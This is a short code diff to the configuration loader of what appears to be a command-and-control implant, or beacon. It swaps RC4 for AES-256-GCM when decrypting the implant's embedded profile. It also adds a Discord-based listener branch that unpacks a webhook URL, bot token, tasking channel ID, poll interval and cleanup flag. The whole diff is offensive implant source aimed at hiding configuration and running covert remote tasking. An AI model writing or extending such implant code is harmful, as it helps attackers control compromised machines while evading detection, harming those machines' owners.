@@ -25,10 +25,11 @@ AgentConfig::AgentConfig()
 	Packer* packer = new Packer((BYTE*)ProfileBytes, size);
 	ULONG profileSize = packer->Unpack32();
 
-	this->encrypt_key = (PBYTE) MemAllocLocal(16);
-	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);
+	this->encrypt_key = (PBYTE) MemAllocLocal(AES_GCM_KEY_SIZE);
+	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, AES_GCM_KEY_SIZE);
 
-	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
+	int plainLen;
+	DecryptAES256GCM(packer->data()+4, profileSize, this->encrypt_key, &plainLen);
 	
 	this->agent_type   = packer->Unpack32();
 	this->kill_date    = packer->Unpack32();
@@ -98,6 +99,14 @@ AgentConfig::AgentConfig()
 	this->profile.burst_jitter  = packer->Unpack32();
 	this->profile.dns_mode      = packer->Unpack32();
 	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
+
+#elif defined(BEACON_DISCORD)
+	this->listener_type            = packer->Unpack32();
+	this->profile.webhook_url      = packer->UnpackBytesCopy(&length);
+	this->profile.bot_token        = packer->UnpackBytesCopy(&length);
+	this->profile.channel_tasks_id = packer->UnpackBytesCopy(&length);
+	this->profile.poll_interval    = packer->Unpack32();
+	this->profile.cleanup          = packer->Unpack8();
 #endif
 
 #if defined(BEACON_DNS)
